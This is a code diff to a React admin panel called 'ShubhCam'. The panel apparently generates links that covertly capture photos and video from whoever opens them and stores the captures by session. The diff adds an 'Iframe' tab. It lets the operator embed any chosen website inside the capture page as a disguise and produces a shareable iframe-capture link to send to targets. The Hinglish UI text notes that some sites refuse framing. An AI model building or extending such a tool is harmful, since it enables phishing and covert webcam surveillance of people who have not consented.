@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { Camera, Link2, Copy, RefreshCw, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Eye, X, Smartphone, Globe, Clock, Image as ImageIcon, Zap, Hash, FolderOpen } from "lucide-react";
+import { Camera, Link2, Copy, RefreshCw, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Eye, X, Smartphone, Globe, Clock, Image as ImageIcon, Zap, FolderOpen, LayoutGrid } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
@@ -27,7 +27,7 @@ interface CapturedVideo {
   user_agent: string | null;
 }
 
-type TabType = "links" | "chrome" | "html" | "media" | "config";
+type TabType = "links" | "chrome" | "html" | "iframe" | "media" | "config";
 
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
@@ -37,6 +37,7 @@ const ShubhCam = () => {
   const [loading, setLoading] = useState(false);
   const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
   const [chromeCustomHtml, setChromeCustomHtml] = useState(settings.chromeCustomHtml || "");
+  const [iframeUrl, setIframeUrl] = useState(settings.camIframeUrl || "");
   const fileInputRef = useRef<HTMLInputElement>(null);
   const chromeFileInputRef = useRef<HTMLInputElement>(null);
   
@@ -51,6 +52,7 @@ const ShubhCam = () => {
   const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
   const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
   const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=${settings.camVideoDuration || 5}&redirect=${encodeURIComponent(redirectUrl)}`;
+  const iframeCaptureLink = `${currentOrigin}/iframe-capture?session=${sessionId}`;
 
   const loadPhotos = async () => {
     setLoading(true);
@@ -104,7 +106,8 @@ const ShubhCam = () => {
   useEffect(() => {
     setCustomHtml(settings.customCaptureHtml || "");
     setChromeCustomHtml(settings.chromeCustomHtml || "");
-  }, [settings.customCaptureHtml, settings.chromeCustomHtml]);
+    setIframeUrl(settings.camIframeUrl || "");
+  }, [settings.customCaptureHtml, settings.chromeCustomHtml, settings.camIframeUrl]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -224,10 +227,16 @@ const ShubhCam = () => {
     toast({ title: "Saved!", description: "Chrome HTML synced" });
   };
 
+  const saveIframeUrl = () => {
+    updateSettings({ camIframeUrl: iframeUrl });
+    toast({ title: "Saved!", description: "Iframe URL synced" });
+  };
+
   const tabs: { id: TabType; icon: React.ReactNode; label: string }[] = [
     { id: "links", icon: <Link2 className="w-3.5 h-3.5" />, label: "Links" },
     { id: "chrome", icon: <Chrome className="w-3.5 h-3.5" />, label: "Chrome" },
     { id: "html", icon: <Code className="w-3.5 h-3.5" />, label: "HTML" },
+    { id: "iframe", icon: <LayoutGrid className="w-3.5 h-3.5" />, label: "Iframe" },
     { id: "media", icon: <FolderOpen className="w-3.5 h-3.5" />, label: `${photos.length + videos.length}` },
     { id: "config", icon: <Settings className="w-3.5 h-3.5" />, label: "Config" },
   ];
@@ -253,7 +262,7 @@ const ShubhCam = () => {
       </div>
 
       {/* Tab Navigation - Grid Style */}
-      <div className="grid grid-cols-5 gap-1.5 mb-4">
+      <div className="grid grid-cols-6 gap-1.5 mb-4">
         {tabs.map((tab) => (
           <button
             key={tab.id}
@@ -519,6 +528,78 @@ const ShubhCam = () => {
           </div>
         )}
 
+        {/* IFRAME TAB */}
+        {activeTab === "iframe" && (
+          <div className="space-y-4">
+            <div className="bg-neon-green/5 border border-neon-green/20 rounded-lg p-3">
+              <div className="flex items-start gap-2">
+                <LayoutGrid className="w-4 h-4 text-neon-green shrink-0 mt-0.5" />
+                <div className="text-xs text-muted-foreground space-y-1">
+                  <p className="text-foreground font-medium">Iframe Capture Page</p>
+                  <p>Koi bhi website embed karo capture page me</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="space-y-3">
+              <div className="flex items-center gap-2">
+                <Globe className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Website URL</span>
+              </div>
+              
+              <Input
+                value={iframeUrl}
+                onChange={(e) => setIframeUrl(e.target.value)}
+                placeholder="https://example.com"
+                className="bg-background/50 border-border/50 font-mono text-xs h-9"
+              />
+
+              <Button
+                onClick={saveIframeUrl}
+                size="sm"
+                className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
+              >
+                <Zap className="w-3 h-3 mr-1" /> Save URL
+              </Button>
+            </div>
+
+            {iframeUrl && (
+              <div className="space-y-2 pt-3 border-t border-border/30">
+                <div className="flex items-center gap-2">
+                  <LayoutGrid className="w-3.5 h-3.5 text-neon-green" />
+                  <span className="text-xs font-medium">Iframe Capture Link</span>
+                </div>
+                <div className="flex gap-2">
+                  <Input
+                    value={iframeCaptureLink}
+                    readOnly
+                    className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
+                  />
+                  <Button
+                    size="icon"
+                    onClick={() => copyToClipboard(iframeCaptureLink)}
+                    className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
+                  >
+                    <Copy className="w-3.5 h-3.5" />
+                  </Button>
+                </div>
+                <Button
+                  onClick={() => window.open(iframeCaptureLink, '_blank')}
+                  variant="outline"
+                  size="sm"
+                  className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
+                >
+                  <ExternalLink className="w-3 h-3 mr-1" /> Test Iframe Link
+                </Button>
+              </div>
+            )}
+
+            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-2 text-[10px] text-muted-foreground">
+              ⚠️ Kuch websites iframe allow nahi karti (X-Frame-Options). Test karke dekho.
+            </div>
+          </div>
+        )}
+
         {/* MEDIA TAB */}
         {activeTab === "media" && (
           <div className="space-y-4">
@@ -597,28 +678,6 @@ const ShubhCam = () => {
         {/* CONFIG TAB */}
         {activeTab === "config" && (
           <div className="space-y-4">
-            {/* Session Config */}
-            <div className="space-y-3">
-              <div className="flex items-center gap-2">
-                <Hash className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Session</span>
-              </div>
-              <div className="flex gap-2">
-                <Input
-                  value={sessionId}
-                  onChange={(e) => updateSettings({ camSessionId: e.target.value })}
-                  className="bg-background/50 border-border/50 font-mono text-xs h-9"
-                />
-                <Button
-                  size="icon"
-                  variant="outline"
-                  onClick={generateNewSession}
-                  className="h-9 w-9 border-neon-green/30 text-neon-green shrink-0"
-                >
-                  <RefreshCw className="w-3.5 h-3.5" />
-                </Button>
-              </div>
-            </div>
 
             {/* Photo Settings */}
             <div className="space-y-3 pt-3 border-t border-border/30">
